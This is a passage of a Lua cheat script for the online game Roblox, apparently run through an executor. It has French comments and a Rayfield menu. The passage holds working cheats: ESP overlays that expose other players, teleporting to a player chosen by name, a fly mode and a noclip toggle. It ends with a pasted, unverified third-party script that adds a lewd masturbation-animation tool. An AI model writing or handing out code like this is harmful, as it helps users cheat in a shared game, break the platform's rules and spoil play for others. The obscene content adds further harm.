         box.Color3 = Color3.fromRGB(255, 255, 255)
         box.SurfaceTransparency = 1
         box.Parent = game.CoreGui

         -- Stockage
         espData[player] = {billboard = billboard, box = box}
      end

      -- Fonction pour retirer l'ESP
      local function removeESP(player)
         local esp = espData[player]
         if esp then
            if esp.billboard then
               esp.billboard:Destroy()
            end
            if esp.box then
               esp.box:Destroy()
            end
            espData[player] = nil
         end
      end

      -- Si activé, ajoute ESP à tous
      if espEnabled then
         for _, player in pairs(Players:GetPlayers()) do
            createESP(player)
         end
      else
         for player, _ in pairs(espData) do
            removeESP(player)
         end
      end

      -- Connexions aux nouveaux joueurs
      Players.PlayerAdded:Connect(function(player)
         player.CharacterAdded:Connect(function()
            if espEnabled then
               task.wait(1)
               createESP(player)
            end
         end)
      end)

      -- Nettoyage quand un joueur quitte
      Players.PlayerRemoving:Connect(function(player)
         removeESP(player)
      end)
   end,
})

-- Fonction de téléportation vers un joueur
local InputTP = Utility:CreateInput({
    Name = "TP vers joueur",
    CurrentValue = "",
    PlaceholderText = "Entrez 3 lettres du pseudo",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        -- Vérifie si le texte est une chaîne valide et a au moins 3 lettres
        if typeof(text) ~= "string" or #text < 3 then
            return
        end

        -- Cherche un joueur dont le nom commence par les 3 lettres
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name:lower():sub(1, 3) == text:lower():sub(1, 3) then
                local targetChar = player.Character or player.CharacterAdded:Wait()
                local targetHRP = targetChar:WaitForChild("HumanoidRootPart", 5)
                local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

                if targetHRP and myHRP then
                    myHRP.CFrame = targetHRP.CFrame + Vector3.new(3, 0, 0)

                    Rayfield:Notify({
                        Title = "TP Réussi",
                        Content = "Tu as été téléporté vers : " .. player.Name,
                        Duration = 4,
                        Image = "bell",
                    })
                else
                    Rayfield:Notify({
                        Title = "Erreur",
                        Content = "Impossible de téléporter (HRP manquant)",
                        Duration = 4,
                        Image = "bell",
                    })
                end
                break
            end
        end
    end
})

local player = game.Players.LocalPlayer
local flying = false
local flySpeed = 50 -- Vitesse de vol
local bodyVelocity = nil
local flyConnection = nil

-- Fonction pour gérer le vol
local function setupFly()
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local rootPart = player.Character:WaitForChild("HumanoidRootPart")
    
    -- Nettoyer l'ancien BodyVelocity s'il existe
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    
    -- Créer un nouveau BodyVelocity
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1000000, 1000000, 1000000)
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = rootPart
    
    -- Désactiver la gravité
    local bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1000000, 1000000, 1000000)
    bodyGyro.P = 1000000
    bodyGyro.Parent = rootPart
    
    -- Gérer le mouvement de vol
    if flyConnection then
        flyConnection:Disconnect()
    end
    
    flyConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not flying or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
        
        local userInputService = game:GetService("UserInputService")
        local moveDirection = Vector3.new(0, 0, 0)
        local camera = workspace.CurrentCamera
        
        if userInputService:IsKeyDown(Enum.KeyCode.W) then
            moveDirection = moveDirection + camera.CFrame.LookVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.S) then
            moveDirection = moveDirection - camera.CFrame.LookVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.A) then
            moveDirection = moveDirection - camera.CFrame.RightVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.D) then
            moveDirection = moveDirection + camera.CFrame.RightVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.Space) then
            moveDirection = moveDirection + Vector3.new(0, 1, 0)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
            moveDirection = moveDirection - Vector3.new(0, 1, 0)
        end
        
        -- Normaliser la direction pour une vitesse constante
        if moveDirection.Magnitude > 0 then
            moveDirection = moveDirection.Unit * flySpeed
        end
        
        if bodyVelocity and bodyVelocity.Parent then
            bodyVelocity.Velocity = moveDirection
        end
    end)
end

-- Fonction pour activer/désactiver le vol
local function toggleFlying()
    flying = not flying
    
    if flying then
        -- Si le personnage n'existe pas, attendre qu'il soit chargé
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character = player.Character or player.CharacterAdded:Wait()
            player.Character:WaitForChild("HumanoidRootPart")
        end
        
        setupFly()
        Rayfield:Notify({
            Title = "Vol activé",
            Content = "Le mode vol est maintenant actif",
            Duration = 2,
        })
    else
        -- Nettoyer les instances
        if bodyVelocity then
            bodyVelocity:Destroy()
            bodyVelocity = nil
        end
        
        if flyConnection then
            flyConnection:Disconnect()
            flyConnection = nil
        end
        
        Rayfield:Notify({
            Title = "Vol désactivé",
            Content = "Le mode vol est maintenant inactif",
            Duration = 2,
        })
    end
end

-- Gérer le respawn du personnage
player.CharacterAdded:Connect(function(newCharacter)
    if flying then
        -- Réactiver le vol après le respawn
        task.wait(0.5) -- Petit délai pour laisser le personnage se charger
        if flying then
            setupFly()
        end
    end
end)

-- Toggle de contrôle du vol
local flyToggle = Utility:CreateToggle({
    Name = "✈️ Mode Vol",
    CurrentValue = false,
    Flag = "FlyToggle",
    Callback = function(Value)
        flying = Value
        if flying then
            -- Si le personnage n'existe pas, attendre qu'il soit chargé
            if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
                player.Character = player.Character or player.CharacterAdded:Wait()
                player.Character:WaitForChild("HumanoidRootPart")
            end
            
            setupFly()
            Rayfield:Notify({
                Title = "Vol activé",
                Content = "Le mode vol est maintenant actif",
                Duration = 2,
            })
        else
            -- Nettoyer les instances
            if bodyVelocity then
                bodyVelocity:Destroy()
                bodyVelocity = nil
            end
            
            if flyConnection then
                flyConnection:Disconnect()
                flyConnection = nil
            end
            
            Rayfield:Notify({
                Title = "Vol désactivé",
                Content = "Le mode vol est maintenant inactif",
                Duration = 2,
            })
        end
    end,
})

local Paragraph = Utility:CreateParagraph({Title = "Pour le noclip", Content = "Attention ! Il faut a chaque fois cliquer sur le bouton pour noclip."})

--------------------------------------------------
-- Noclip (amélioré, robuste, maintient l'état initial)
--------------------------------------------------
local noclipEnabled = false
local noclipConnection = nil
local respawnConnection = nil
local originalCollideStates = {}

-- Fonction utilitaire : sauvegarde l'état initial de CanCollide
local function saveCollideStates(char)
    originalCollideStates = {}
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsDescendantOf(char:FindFirstChildOfClass("Accessory")) then
            originalCollideStates[part] = part.CanCollide
        end
    end
end

-- Fonction utilitaire : applique noclip
local function setNoclip(char, value)
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsDescendantOf(char:FindFirstChildOfClass("Accessory")) then
            if value then
                part.CanCollide = false
            else
                if originalCollideStates[part] ~= nil then
                    part.CanCollide = originalCollideStates[part]
                else
                    part.CanCollide = true
                end
            end
        end
    end
end

-- Fonction utilitaire : active le noclip
local function enableNoclip()
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    saveCollideStates(char)
    noclipConnection = game:GetService("RunService").Heartbeat:Connect(function()
        setNoclip(char, true)
    end)
    -- Gestion du respawn
    respawnConnection = game.Players.LocalPlayer.CharacterAdded:Connect(function(newChar)
        saveCollideStates(newChar)
        setNoclip(newChar, true)
    end)
    Rayfield:Notify({ Title = "Noclip", Content = "Noclip activé !", Duration = 3 })
end

-- Fonction utilitaire : désactive le noclip
local function disableNoclip()
    if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
    if respawnConnection then respawnConnection:Disconnect() respawnConnection = nil end
    local char = game.Players.LocalPlayer.Character
    if char then
        setNoclip(char, false)
    end
    Rayfield:Notify({ Title = "Noclip", Content = "Noclip désactivé.", Duration = 3 })
end

local Button = Utility:CreateButton({
    Name = "🚀 Noclip (Toggle)",
    Callback = function()
        noclipEnabled = not noclipEnabled
        if noclipEnabled then
            enableNoclip()
        else
            disableNoclip()
        end
    end,
})

local Button = Utility:CreateButton({
   Name = "Jerk Off",
   Callback = function()
   --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local plr = game:GetService("Players").LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
local anim = hum:FindFirstChildOfClass("Animator") or hum:WaitForChild("Animator")
local pack = plr:FindFirstChild("Backpack") or plr:WaitForChild("Backpack")

if workspace:FindFirstChild("aaa") then
	workspace:FindFirstChild("aaa"):Destroy()
end

local function getmodel()
	return hum.RigType == Enum.HumanoidRigType.R15 and "R15" or "R6"
end

local function Notify(Title, Text, Duration)
	game:GetService('StarterGui'):SetCore('SendNotification', {
        Title = Title,
        Text = Text or '',
        Duration = Duration}
    )
end	

Notify("Script made by", "VixHub", 20)

local animation = Instance.new("Animation")
animation.Name = "aaa"
animation.Parent = workspace

animation.AnimationId = getmodel() == "R15" and "rbxassetid://698251653" or "rbxassetid://72042024"

local tool = Instance.new("Tool")
tool.Name = "Jerk"
tool.RequiresHandle = false
tool.Parent = pack

local doing = false
local animtrack = nil

tool.Equipped:Connect(function()
	doing = true
	while doing do
		if not animtrack then
			animtrack = anim:LoadAnimation(animation)
		end

		animtrack:Play()
		animtrack:AdjustSpeed(0.7)
		animtrack.TimePosition = 0.6

		task.wait(0.1)
		while doing and animtrack and animtrack.TimePosition < 0.7 do
			task.wait(0.05)
		end

		if animtrack then
			animtrack:Stop()
			animtrack:Destroy()
			animtrack = nil
		end
	end
end)

tool.Unequipped:Connect(function()
	doing = false
	if animtrack then
		animtrack:Stop()
		animtrack:Destroy()
		animtrack = nil
	end
end)

hum.Died:Connect(function()
	doing = false
	if animtrack then
		animtrack:Stop()
		animtrack:Destroy()
		animtrack = nil
	end
end)

   end,
})
